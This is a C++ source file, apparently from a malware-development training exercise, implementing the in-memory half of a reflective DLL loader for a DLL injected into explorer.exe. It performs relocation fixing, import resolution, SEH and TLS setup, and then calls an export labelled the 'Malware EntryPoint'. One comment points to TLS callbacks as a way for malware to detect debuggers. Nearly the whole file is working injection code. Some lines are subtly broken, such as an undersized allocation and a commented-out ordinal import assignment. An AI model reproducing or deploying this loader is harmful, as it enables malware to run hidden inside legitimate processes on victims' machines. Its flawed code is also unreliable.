#include "../Dropper/shared.h"
#include "ReflectiveDLL.h"

//Exercise 5
// This function will rebase or relocate the injected DLL, as we are now working INSIDE the virtual memory of the injected application explorer.exe
// there is no need to use functions that will perform actions on EXTERNAL processes (e.g. NtReadVirtualMemory).
// e.g. Let's say you want to print out the first WORD of your injected DLL (which will be 5D4A, this is big endian ofcourse)
// PVOID imagebase=(PVOID)0x180000000
// WORD MZ=*(WORD*)imagebase;
// printf("0x%02x",(WORD)MZ);
//See slides for more information, also checkout the whitepaper for relocations
DWORD RebaseImage(PVOID pImageBase, PIMAGE_NT_HEADERS pINH, DWORD64 dwDelta, PREFLECTIVE_LOADER_HELPER pHelper) {
	DWORD64 dwRelocTableSize; //Total size of all blocks and all entries
	PBASE_RELOCATION_BLOCK pBaseRelocationBlock; //Structure to hold block data
	PBASE_RELOCATION_ENTRY pBaseRelocationEntry; //Structure to hold entry data
	DWORD dwBlockPosition = 0; //Keeps track of current block position for loop
	DWORD dwEntryPosition = 0; //Keeps track of current entry position inside a block for second loop
	DWORD dwNumberOfEntries; //Total number of entries in a block
	DWORD64 dwTotalOffsetReloc; //This is the total that needs to be added to the memory where an entry points to, so in short this is baseaddress+BLOCK PageRVA+entry RVA
	//if (pHelper->dwDelta != 0) {
		//Get size of the RelocationTable
		//We need this to loop through all relocation blocks
		//tip: IMAGE_DIRECTORY_ENTRY_BASERELOC is the index you need in DataDirectory
		dwRelocTableSize = pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

		// Get the first block from the relocation table
		pBaseRelocationBlock = (PBASE_RELOCATION_BLOCK)((LPBYTE)pImageBase + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		
		dwBlockPosition = 0;
		while (dwBlockPosition < dwRelocTableSize) {
			//Calculate how many entries each block has, this is not in any structure. So we will perform the calculation ourself
			dwNumberOfEntries = (pBaseRelocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			
			dwEntryPosition = 0;

			for (int i = 0; i < (int)dwNumberOfEntries; i++) {
				//Get Relocation entry
				pBaseRelocationEntry = (PBASE_RELOCATION_ENTRY)((LPBYTE)pBaseRelocationBlock + sizeof(BASE_RELOCATION_BLOCK) + dwEntryPosition);

				//Calculate the total offset to the memory address which we need to update
				//To find the full offset we need to add the offset found in the ENTRY, the RVA PageAddress found in the BLOCK and the baseaddress where the image is loaded in the target process
				dwTotalOffsetReloc = (DWORD64)pBaseRelocationBlock->PageAddress + (DWORD64)pBaseRelocationEntry->offset + (DWORD64)pImageBase;

				//Check type of offset
				switch ((WORD)pBaseRelocationEntry->type) {
					//Type 0 ignore
				case 0x0:
					break;
					//Type 3: Used in 32bit PE files
				case 0x3:
					break;
					//Type 10: Used in 64bit PE files
				case 0xa:
					// Update the memory location you have calculated using the dwDelta
					// TIP:
					// You will need to first make the memory PAGE_READ_WRITE using virtual protect, check the helper structure for VirtualProtect
					// After changing it make sure you put the memory protection back to it's orignal value, this value is stored in old_prot (see MSDN virtualprotect)
					// Also you calculated 
					DWORD old_prot;
					pHelper->ReflectiveLoaderFunctions.__VirtualProtect((PVOID)dwTotalOffsetReloc, sizeof(DWORD64), PAGE_READWRITE, &old_prot);
					*reinterpret_cast<DWORD64*>(dwTotalOffsetReloc) = *reinterpret_cast<DWORD64*>(dwTotalOffsetReloc)+dwDelta;
					pHelper->ReflectiveLoaderFunctions.__VirtualProtect((PVOID)dwTotalOffsetReloc, sizeof(DWORD64), old_prot, &old_prot);
					break;
				default:
					break;

				}
				//Increase the ENTRY position with the size of an ENTRY, which is always 2 WORDS or 1 DWORD
				dwEntryPosition += sizeof(BASE_RELOCATION_ENTRY);
			}
			// Increase the BLOCK position with the size of the current looped block
			dwBlockPosition += pBaseRelocationBlock->BlockSize;
			//Get Next Block using the dwBlockPosition
			pBaseRelocationBlock = (PBASE_RELOCATION_BLOCK)((LPBYTE)pImageBase + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + dwBlockPosition);
		}
	//}
	return 1;
}

// Exercise 6
// You will need to fix the imports in this function
// So that means looping through all entries in the IMAGE_IMPORT_DESCRIPTOR, remember that you will need to account for importing by name and ordinal
DWORD FixImports(PREFLECTIVE_LOADER_HELPER pHelper){
		HMODULE hModule = NULL;
		PIMAGE_THUNK_DATA FirstThunk, OrigFirstThunk;
		PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)pHelper->ImportTableAddress;
		PIMAGE_IMPORT_BY_NAME pIBN;
		DWORD64 Function;

		//Loop through thunks until 00 00 00 00
		while (pIID->Characteristics) {
			OrigFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)pHelper->ImageBase + pIID->OriginalFirstThunk);
			FirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)pHelper->ImageBase + pIID->FirstThunk);

			//Load the first library found
			hModule = pHelper->ReflectiveLoaderFunctions.__LoadLibrary((LPCSTR)pHelper->ImageBase + pIID->Name);
			if (!hModule) {
				return 0;
			}

			//Loop through functions to import
			while (OrigFirstThunk->u1.AddressOfData) {
				if (OrigFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {

					// Import by ordinal
					Function = (DWORD64)pHelper->ReflectiveLoaderFunctions.__GetProcAddress(hModule, (LPCSTR)(OrigFirstThunk->u1.Ordinal & 0xFFFF));

					if (!Function)
					{
						return 0;
					}
					//FirstThunk->u1.Function = Function;
				}
				else {

					// Import by name
					pIBN = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)pHelper->ImageBase + OrigFirstThunk->u1.AddressOfData);

					Function = (DWORD64)pHelper->ReflectiveLoaderFunctions.__GetProcAddress(hModule, (LPCSTR)pIBN->Name);
					if (!Function)
					{
						return 0;
					}

					FirstThunk->u1.Function = Function;
				}
				OrigFirstThunk++;
				FirstThunk++;
			}
			pIID++;
		}
		return 1;
}

//##################################################################################################################################################################################//
// FUNCTIONS DEFINED UNDERNEATH ARE NOT TO BE CHANGED, IF YOU DO AND SCREW SOMETHING UP YOU ARE ON YOUR OWN
extern "C" __declspec(dllexport) void ReflectiveInjection(PVOID pHelperAddress)
{
	PREFLECTIVE_LOADER_HELPER pHelper = (PREFLECTIVE_LOADER_HELPER)pHelperAddress;
	PIMAGE_NT_HEADERS pINH = pHelper->pINH;
	PIMAGE_EXPORT_DIRECTORY pIED = (PIMAGE_EXPORT_DIRECTORY)pHelper->ExportTableAddress;
	PIMAGE_EXPORT_ADDRESS_ENTRY pIED_entry;
	
	PIMAGE_TLS_DIRECTORY pITD = (PIMAGE_TLS_DIRECTORY)pHelper->TLSDirectory;
	PIMAGE_TLS_CALLBACK *pCallback;
	PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry;
	PVOID pTLSAlloc = NULL, pImageBase = pHelper->ImageBase;
	
	
	DLL_MAIN _DLL_MAIN;
	EntryPoint _EntryPoint;

	//Rebase Image
	if (pHelper->dwDelta != 0) {
		RebaseImage(pImageBase, pINH, pHelper->dwDelta, pHelper);
	}

	//Fix Imports
	FixImports(pHelper);
	

	//Initialize SEH (only for windows 8.1 and up, for windows 7 you will need to use a different function)
	pHelper->ReflectiveLoaderFunctions.__RtlInsertInvertedFunctionTable(pHelper->ImageBase, (PVOID)(DWORD64)pHelper->pINH->OptionalHeader.SizeOfImage);

	//Initiliase TLS
	if (pITD != NULL) {
		//Allocate the structure in memory
		pTLSAlloc = pHelper->ReflectiveLoaderFunctions.__VirtualAlloc(NULL, sizeof(PLDR_DATA_TABLE_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		//Cast the memory address to the PLDR_DATA_TABLE_ENTRY structure
		pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pTLSAlloc;
		//Populate the DLLBASE with the imagebase
		pLdrDataTableEntry->DllBase = pHelper->ImageBase;
		//Call LdrpHandleTlsData with the pointer to the structure
		pHelper->ReflectiveLoaderFunctions.__LdrpHandleTlsData(PLDR_DATA_TABLE_ENTRY(pLdrDataTableEntry));

		//Performe TLS callbacks
		//As you see now, TLS callbacks are called before calling DLLmain, so your malware could use this to e.g. check for debuggers
		pCallback = (PIMAGE_TLS_CALLBACK*)pITD->AddressOfCallBacks;
		if (pCallback)
		{
			while (*pCallback)
			{
				(*pCallback)((LPVOID)pHelper->ImageBase, DLL_PROCESS_ATTACH, NULL);
				pCallback++;
			}
		}
	}
	
	//UNCOMMENT THERE LINES ONLY WHEN YOU HAVE COMPLETED ALL EXERCICES! 

	//Start Entrypoint
	if (pHelper->pINH->OptionalHeader.AddressOfEntryPoint)
	{
		//Call DLLMAIN first with DLL_PROCESS_ATTACH to init CRT
		_DLL_MAIN = (DLL_MAIN)((LPBYTE)pHelper->ImageBase + pHelper->pINH->OptionalHeader.AddressOfEntryPoint);
		_DLL_MAIN((HMODULE)pHelper->ImageBase, DLL_PROCESS_ATTACH, NULL);

		//Call the Malware EntryPoint
		pIED_entry = (PIMAGE_EXPORT_ADDRESS_ENTRY)((LPBYTE)pHelper->ImageBase + pIED->AddressOfFunctions);
		_EntryPoint= (EntryPoint)((LPBYTE)pHelper->ImageBase + pIED_entry->Address);
		_EntryPoint();
	}

}
